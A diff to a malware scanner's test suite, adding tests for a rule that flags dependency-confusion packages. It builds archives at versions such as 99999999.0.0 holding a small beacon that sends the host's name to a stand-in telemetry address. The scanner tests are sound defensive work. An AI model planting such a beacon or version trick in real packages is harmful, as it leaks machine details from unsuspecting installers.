@@ -488,6 +488,55 @@ class TestCodeFromADataFile:
         assert self.RULE not in self.rules(tmp_path, module)
 
 
+class TestADependencyConfusionBeacon:
+    """promptflow_runtime 99999999.0.0: an internal framework's name at a version nobody releases,
+    whose runtime puts the host's names into what it sends."""
+
+    RULE = "MALWARE.EXFIL.CONFUSION_BEACON.001"
+    SENDS = (
+        "import json, socket, urllib.request\n"
+        "def report():\n"
+        "    who = {'host': socket." + Spelled.of("get", "hostname") + "()}\n"
+        "    urllib.request.urlopen('https://telemetry.example.org/r', json.dumps(who).encode())\n"
+    )
+
+    @staticmethod
+    def rules(tmp_path: Path, version: str, module: str) -> set[str]:
+        members = {
+            "PKG-INFO": f"Metadata-Version: 2.1\nName: telem\nVersion: {version}\n",
+            "pyproject.toml": f"[project]\nname = 'telem'\nversion = '{version}'\n",
+            "telem/__init__.py": "from . import runtime\n",
+            "telem/runtime.py": module,
+        }
+        archive = tmp_path / f"telem-{version}.tar.gz"
+        with tarfile.open(archive, "w:gz") as tgz:
+            for name, text in members.items():
+                data = text.encode("utf-8")
+                info = tarfile.TarInfo(f"telem-{version}/{name}")
+                info.size = len(data)
+                tgz.addfile(info, io.BytesIO(data))
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
+        return {f.rule_id for f in result.findings}
+
+    @pytest.mark.parametrize("version", ["99999999.0.0", "99.0.0", "7.7.7"])
+    def test_a_confusion_version_that_sends_the_host_blocks(
+        self, tmp_path: Path, version: str
+    ) -> None:
+        assert self.RULE in self.rules(tmp_path, version, self.SENDS)
+
+    @pytest.mark.parametrize("version", ["1.4.2", "2024.10.1"])
+    def test_an_ordinary_version_sending_the_same_does_not(
+        self, tmp_path: Path, version: str
+    ) -> None:
+        assert self.RULE not in self.rules(tmp_path, version, self.SENDS)
+
+    def test_a_confusion_version_that_sends_nothing_about_the_host_does_not(
+        self, tmp_path: Path
+    ) -> None:
+        quiet = "import urllib.request\ndef ping():\n    urllib.request.urlopen('https://example.org/')\n"
+        assert self.RULE not in self.rules(tmp_path, "99999999.0.0", quiet)
+
+
 class TestADnsTunnel:
     @staticmethod
     def rules(tmp_path: Path, module: str) -> set[str]:
